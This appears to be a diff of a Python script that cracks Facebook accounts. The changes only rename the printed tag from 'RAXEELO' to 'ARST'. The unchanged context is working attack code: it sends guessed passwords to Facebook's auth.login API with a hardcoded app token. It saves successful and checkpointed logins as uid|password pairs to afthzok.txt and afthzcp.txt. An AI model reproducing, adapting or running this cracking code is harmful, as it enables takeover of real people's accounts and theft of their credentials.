@@ -671,7 +671,7 @@ def crack_select():
 				oks.append(uid+pass1)
 			else:
 				if "www.facebook.com" in q["error_msg"]:
-					print(" \033[1;33m [RAXEELO_CP] "+uid+" | "+pass1+"\033[0;97m")
+					print(" \033[1;33m [ARST_CP] "+uid+" | "+pass1+"\033[0;97m")
 					cp = open("afthzcp.txt", "a")
 					cp.write(uid+"|"+pass1+"\n")
 					cp.close()
@@ -681,14 +681,14 @@ def crack_select():
 					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 					q = json.loads(data)
 					if "access_token" in q:
-						print(" \033[1;32m [RAXEELO-OK] "+uid+" | "+pass2+"\033[0;97m")
+						print(" \033[1;32m [ARST-OK] "+uid+" | "+pass2+"\033[0;97m")
 						ok = open("afthzok.txt", "a")
 						ok.write(uid+"|"+pass2+"\n")
 						ok.close()
 						oks.append(uid+pass2)
 					else:
 						if "www.facebook.com" in q["error_msg"]:
-							print(" \033[1;33m [RAXEELO_CP] "+uid+" | "+pass2+"\033[0;97m")
+							print(" \033[1;33m [ARST_CP] "+uid+" | "+pass2+"\033[0;97m")
 							cp = open("afthzcp.txt", "a")
 							cp.write(uid+"|"+pass2+"\n")
 							cp.close()
@@ -739,7 +739,7 @@ def crack_select():
 												oks.append(uid+pass5)
 											else:
 												if "www.facebook.com" in q["error_msg"]:
-													print(" \033[1;33m [RAXEELO_CP] "+uid+" | "+pass5+"\033[0;97m")
+													print(" \033[1;33m [ARST_CP] "+uid+" | "+pass5+"\033[0;97m")
 													cp = open("afthzcp.txt", "a")
 													cp.write(uid+"|"+pass5+"\n")
 													cp.close()
@@ -877,7 +877,7 @@ def choice_select():
 				oks.append(uid+pass1)
 			else:
 				if "www.facebook.com" in q["error_msg"]:
-					print(" \033[1;33m [RAXEELO_CP] "+uid+" | "+pass1+"\033[0;97m")
+					print(" \033[1;33m [ARST_CP] "+uid+" | "+pass1+"\033[0;97m")
 					cp = open("afthzcp.txt", "a")
 					cp.write(uid+"|"+pass1+"\n")
 					cp.close()
@@ -886,14 +886,14 @@ def choice_select():
 					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 					q = json.loads(data)
 					if "access_token" in q:
-						print(" \033[1;32m [RAXEELO-OK] "+uid+" | "+pass2+"\033[0;97m")
+						print(" \033[1;32m [ARST-OK] "+uid+" | "+pass2+"\033[0;97m")
 						ok = open("afthzok.txt", "a")
 						ok.write(uid+"|"+pass2+"\n")
 						ok.close()
 						oks.append(uid+pass2)
 					else:
 						if "www.facebook.com" in q["error_msg"]:
-							print(" \033[1;33m [RAXEELO_CP] "+uid+" | "+pass2+"\033[0;97m")
+							print(" \033[1;33m [ARST_CP] "+uid+" | "+pass2+"\033[0;97m")
 							cp = open("afthzcp.txt", "a")
 							cp.write(uid+"|"+pass2+"\n")
 							cp.close()
@@ -902,14 +902,14 @@ def choice_select():
 							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 							q = json.loads(data)
 							if "access_token" in q:
-								print(" \033[1;32m [RAXEELO-OK] "+uid+" | "+pass3+"\033[0;97m")
+								print(" \033[1;32m [ARST-OK] "+uid+" | "+pass3+"\033[0;97m")
 								ok = open("afthzok.txt", "a")
 								ok.write(uid+"|"+pass3+"\n")
 								ok.close()
 								oks.append(uid+pass3)
 							else:
 								if "www.facebook.com" in q["error_msg"]:
-									print(" \033[1;33m [RAXEELO_CP] "+uid+" | "+pass3+"\033[0;97m")
+									print(" \033[1;33m [ARST_CP] "+uid+" | "+pass3+"\033[0;97m")
 									cp = open("afthzcp.txt", "a")
 									cp.write(uid+"|"+pass3+"\n")
 									cp.close()
@@ -996,14 +996,14 @@ def ran():
 							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+k+co+user+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true").text
 							q = json.loads(data)
 							if "access_token" in q:
-								print(" \033[1;32m[RAXEELO_OK] "+k+co+user+" | "+q["uid"]+" | "+pass1+"\033[0;97m")
+								print(" \033[1;32m[ARST_OK] "+k+co+user+" | "+q["uid"]+" | "+pass1+"\033[0;97m")
 								ok = open("afthzok.txt", "a")
 								ok.write(k+co+user+"|"+pass3+"\n")
 								ok.close()
 								oks.append(k+co+user+pass3)
 							else:
 								if "www.facebook.com" in q["error_msg"]:
-									print(" \033[1;33m [RAXEELO_CP] "+k+co+user+" | "+pass3+"\033[0;97m")
+									print(" \033[1;33m [ARST_CP] "+k+co+user+" | "+pass3+"\033[0;97m")
 									cp = open("afthzcp.txt", "a")
 									cp.write(k+co+user+"|"+pass3+"\n")
 									cp.close()
